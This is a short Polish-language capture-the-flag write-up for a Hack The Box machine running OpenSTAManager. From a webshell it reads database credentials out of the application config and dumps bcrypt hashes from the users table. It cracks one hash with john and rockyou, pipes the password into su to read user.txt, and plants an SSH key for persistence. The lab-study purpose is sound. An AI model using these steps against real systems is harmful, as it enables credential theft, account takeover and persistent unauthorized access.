# MySQL z configu + bcrypt → user

## Odczyt credów DB

Z webshella (www-data czyta pliki aplikacji):

```bash
grep -E 'db_|password' /var/www/html/openstamanager/config.inc.php
```

Typowe: dedykowany użytkownik MySQL z GRANT tylko na jedną bazę (`openstamanager`).

## Co wyciągnąć z bazy

```sql
SELECT username, password FROM zz_users;
```

- Hasła aplikacji: **bcrypt** (`$2y$10$...`).
- Hash admina OpenSTA ≠ hasło z maila (plaintext w UI); oba są użyteczne w innym kontekście.

## Crack

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash.txt
```

Na boxie: `haris` → **bestfriends** (motyw „Friends” + liczby w DB pass `Fri3nds@9099` — podpowiedź słownikowa).

## Lateral na host

- SSH na HTB często **tylko klucz** — hasło OSM przydaje się do `su haris` z www-data:

```bash
printf 'bestfriends\n' | su haris -c 'cat /home/haris/user.txt'
```

- `user.txt` czasem `root:haris` mode `640` — tylko grupa/user haris czyta.

## SSH key persistence

```bash
ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519_htb -N ''
# su haris → ~/.ssh/authorized_keys
```

## Ćwiczenie

Wygeneruj bcrypt w PHP (`password_hash`), złam johnem jednym słowem z rockyou. Połącz z lokalnym MySQL i tabelą „users” w aplikacji testowej.